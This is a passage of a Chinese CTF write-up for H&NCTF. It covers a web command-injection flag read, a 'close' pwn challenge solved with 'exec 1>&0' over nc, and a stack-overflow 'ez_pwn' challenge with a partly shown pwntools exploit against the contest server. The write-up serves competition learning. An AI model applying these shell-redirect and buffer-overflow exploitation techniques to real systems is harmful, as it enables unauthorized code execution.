class=&#34;string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;)).read())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之后访问 /test?cmd=cat+/flag 成功出 flag：flag {42ae8a8b-4f88-4c45-a162-bd1881da16ea}。&lt;/p&gt;
&lt;h1 id=&#34;pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; Pwn:&lt;/h1&gt;
&lt;h2 id=&#34;close&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#close&#34;&gt;#&lt;/a&gt; close&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;	逆天题目，纯牛马出题人，想暴打。

	拿到题目第一件事儿是检查保护，这个题保护也就那样，PIE加NX。
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@g01den-virtual-machine:/mnt/shared# checksec pwn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &amp;#x27;/mnt/shared/pwn&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;	反编译看看：
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;**********************************&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*     Welcome to the H&amp;amp;NCTF!     *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;**********************************&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*             *****              *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*            *     *             *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*           *  o o  *            *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*          *    v    *           *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*         *  *     *  *          *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*         * * * * * * *          *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;**********************************&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;*      Do you know close?        *&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;**********************************&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  close(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;	这题目什么玩意儿？关闭了标准输出流还玩儿毛线？

	算了，老老实实干就完了。经过长时间查找资料，最后找到了做法。
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@g01den-virtual-machine:/mnt/shared&lt;span class=&#34;meta&#34;&gt;# nc hnctf.imxbt.cn 35345&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls: write error: Bad file descriptor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exec &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;H-NCTF&amp;#123;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;d409dad&lt;span class=&#34;number&#34;&gt;-4b&lt;/span&gt;2f&lt;span class=&#34;number&#34;&gt;-4687&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-9f&lt;/span&gt;17&lt;span class=&#34;number&#34;&gt;-8b&lt;/span&gt;450a76946c&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code&gt;	心中暗暗暴打出题人两分钟泄愤。    (*￣︿￣)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ez_pwn复现exp是大佬的有时间自己再写个exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ez_pwn复现exp是大佬的有时间自己再写个exp&#34;&gt;#&lt;/a&gt; ez_pwn（复现，exp 是大佬的，有时间自己再写个 exp）&lt;/h2&gt;
&lt;p&gt;看到这个题，我突然觉得我是个执杖，我还以为是出题人故意搞我心态，结果是我学艺不精的缘故，好吧，我的问题，没看出来，我摊牌了，我是个 XX。&lt;br&gt;
好吧，老样子，Ubuntu 启动！！！&lt;br&gt;
还是先查看保护：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@g01den-virtual-machine:/mnt/shared&lt;span class=&#34;comment&#34;&gt;# checksec pwn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/mnt/shared/pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     i386-32-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (0x8048000)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后 IDA 反编译，漏洞函数为：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;vul&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; s[&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [esp+0h] [ebp-2Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(s, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, s, &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, %s\n&amp;quot;&lt;/span&gt;, s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, s, &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, %s\n&amp;quot;&lt;/span&gt;, s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现了点东西，就是，这里存在一些问题，就是，read 函数读取的数据为 48 字节，但是，经过动态调试得出的缓冲区 s 的大小为 44 字节，好好好，IDA 你又得记大过了。&lt;br&gt;
之后，第一次不需要溢出，将缓冲区全部写满即可，因为存在 % s 这个格式串配合 printf 函数，所以，能够直接把 rbp 的值给打印出来，所以只需要接收之后，就可以拿到 rbp 的值了，然后，通过动态调试得到的 rbp 的地址与缓冲区 buf 的地址，就可以拿到字符串的地址了。&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/274c8e349eb022da9e344e7bc10beaf3.png&#34; alt=&#34;Screenshot 2024-05-14 234816.png&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://img-blog.csdnimg.cn/img_convert/5b55b3705f40fde32011de08190abef9.png&#34; alt=&#34;Screenshot 2024-05-14 234826.png&#34;&gt;&lt;br&gt;
 接收到了 rbp 的值之后，减去 56 就可以得到字符串的地址了。&lt;br&gt;
之后则是需要通过栈调用 read 函数，向 bss 段写入 sh;（这里我没弄懂为啥不能直接传 /bin/sh，而是要传 sh; 进去），之后重新调用 main 函数重新运行程序，不过，到了这里之后会出一点问题，那就是，第二次进入 main 之后，栈的布局会发生变化，重新进入 vul 函数之后，里面的指针指向的是 vul 函数内的字符串，而不是之前那个，所以这里需要重新进行一次字符串地址的泄露，之后才能对栈进行布局来调用 system 函数。&lt;br&gt;
大佬的 exp 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# from LibcSearcher import *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; itertools&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;, arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;, log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;is_debug = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;IP = &lt;span class=&#34;string&#34;&gt;&amp;quot;hnctf.yuanshen.life&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PORT = &lt;span class=&#34;number&#34;&gt;33070&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = context.binary = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = elf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;connect&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; remote(IP, PORT) &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; is_debug &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; process()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;g = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: gdb.attach(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: p.send(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: p.sendline(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x, y: p.sendafter(x, y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x, y: p.sendlineafter(x, y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x=&lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;: p.recv() &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; p.recv(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: p.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; x: p.recvuntil(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r_leak_libc_64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;: u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span 